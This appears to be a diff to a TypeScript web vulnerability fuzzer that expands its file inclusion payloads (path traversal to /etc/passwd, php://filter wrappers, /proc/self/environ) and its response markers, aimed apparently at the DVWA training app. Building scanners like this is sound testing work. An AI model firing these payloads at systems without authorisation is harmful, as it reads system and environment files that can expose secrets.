@@ -484,15 +484,44 @@ const CMD_PAYLOADS = [
 ];
 
 const FI_PAYLOADS = [
+  // DVWA include() accepts ABSOLUTE paths — try direct /etc/passwd first
+  '/etc/passwd',
   '../../../../../../etc/passwd',
   '../../../../../etc/passwd',
   '../../../../etc/passwd',
   '....//....//....//....//etc/passwd',
   '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
+  // PHP filter wrappers (works on DVWA's PHP include)
+  'php://filter/convert.base64-encode/resource=/etc/passwd',
   'php://filter/convert.base64-encode/resource=index.php',
+  // Alternative Linux files (in case /etc/passwd is restricted)
+  '/etc/issue',
+  '/etc/hostname',
+  '/proc/self/environ',
 ];
 
-const FI_MARKERS = ['root:', 'bin:', 'daemon:', '/bin/sh', '/bin/bash', 'nobody:', 'uid=0', 'root:x:0:0'];
+// Markers from /etc/passwd on modern Linux (shadow passwords — "root:x:0:0:")
+// AND legacy format ("root:abc:0:0:")
+// Also /etc/issue markers (Ubuntu etc.) and /proc/self/environ
+const FI_MARKERS = [
+  'root:x:0:0',     // modern shadow-based /etc/passwd
+  'root:*:0:0',     // alternative root entry
+  'bin:x:1:1',
+  'daemon:x:2:2',
+  'nobody:x:65534',
+  '/bin/sh',
+  '/bin/bash',
+  '/usr/sbin/nologin',
+  'root:0:0',       // legacy /etc/passwd without shadow
+  'bin:1:1',
+  'daemon:2:2',
+  // /etc/issue markers
+  'Ubuntu',
+  'Debian',
+  // /proc/self/environ markers
+  'PATH=',
+  'HOME=',
+];
 
 export async function fuzzCommandInjection(
   targetUrl: string,
@@ -605,6 +634,38 @@ export async function fuzzFileInclusion(
             }
           } catch {}
         }
+      }
+
+      // Per Claude §5 (oracle honesty): also detect PHP warnings as a
+      // SEMI-CONFIRMED file_inclusion (oracle: error-message).
+      // If payload triggers PHP "Failed to open stream" / "No such file"
+      // warnings, the include() tried to open our payload — surface exists.
+      // Only count if we see BOTH our payload string AND the PHP warning
+      // (otherwise just default PHP behavior, not LFI).
+      const phpWarningPatterns = [
+        /Failed opening required.*?(?:"|')([^"']+)(?:"|')/i,
+        /include\(\): Failed opening.*?/i,
+        /No such file or directory/i,
+        /Permission denied/i,
+        /include\(\):/i,
+        /require\(\):/i,
+        /Warning.*include/i,
+      ];
+      const phpWarningMatch = phpWarningPatterns.find(p => p.test(text));
+      if (phpWarningMatch && text.includes(payload.slice(0, 20))) {
+        // SEMI-CONFIRMED — surface exists, file not readable
+        // But per Claude "не дропай candidates" — keep as confirmed = false
+        findings.push({
+          type: 'file_inclusion',
+          severity: 'low',
+          confirmed: false,
+          oracle: 'error-message',
+          evidence: `LFI surface detected via PHP warning: ${phpWarningMatch}. Payload "${payload}" was passed to include(). File may not exist or be restricted — but include path is injectable.`,
+          payload,
+          target: targetUrl,
+          parameter,
+        });
+        // Don't break — keep trying other payloads for full confirmation
       }
     } catch (e) {
       console.log(`[active-fuzzer]   fi payload failed: ${String(e).slice(0, 80)}`);
